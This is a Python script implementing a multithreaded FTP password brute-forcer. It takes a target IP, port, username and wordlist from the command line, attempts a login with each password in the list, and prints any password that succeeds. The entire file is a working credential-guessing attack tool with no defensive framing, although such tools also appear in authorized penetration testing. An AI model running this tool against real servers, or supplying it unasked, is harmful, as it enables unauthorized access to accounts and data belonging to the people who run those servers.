import ftplib
import sys
from concurrent.futures import ThreadPoolExecutor
import optparse
import os
import queue
import termcolor

class FTPBruteForce:
    def __init__(self) -> None:
        self.target = self.get_params()[0]
        self.port = self.get_params()[1]
        self.username = self.get_params()[2]
        self.wordlist = self.get_params()[3]
        self.q = queue.Queue()

    def get_params(self):
        parser = optparse.OptionParser('Usage: ./%s -t target IP address -p port -u username -w wordlist' % sys.argv[0])
        parser.add_option('-t', '--target', dest='target', type='string', help='Specify target IP address')
        parser.add_option('-p', '--port', dest='port', type='int', help='Specify port')
        parser.add_option('-u', '--username', dest='username', type='string', help='Specify username')
        parser.add_option('-w', '--wordlist', dest='wordlist', type='string', help='Specify wordlist')
        options, args = parser.parse_args()
        if options.target is None:
            print(parser.usage)
            sys.exit()
        if options.port is None:
            options.port = 21
        if not os.path.exists(options.wordlist):
            print('The wordlist does not exist!')
            sys.exit()
        if options.username is None:
            print('Specify username')
            sys.exit()
        return options.target, options.port, options.username, options.wordlist
    
    def ftp_login(self, password):
        print('Attempting to login using password: %s' % password)
        ftp = ftplib.FTP(self.target)
        try:
            ftp.connect(host=self.target, port=self.port)
            ftp.login(user=self.username, passwd=password)
            print('Password Found: ', termcolor.colored(password, 'blue') )
            self.q.put(password)
        except:
            pass
        finally:
            ftp.close()
    
    def run(self):
        pool = ThreadPoolExecutor(max_workers=5)
        with open(self.wordlist, 'r') as f:
            while True:
                line = f.readline()
                if len(line) == 0:
                    break
                if self.q.empty():
                    pool.submit(self.ftp_login, line.strip())
        
        pool.shutdown()
        if self.q.empty():
            print('Failed to crack')

if __name__ == '__main__':
    cracker = FTPBruteForce()
    cracker.run()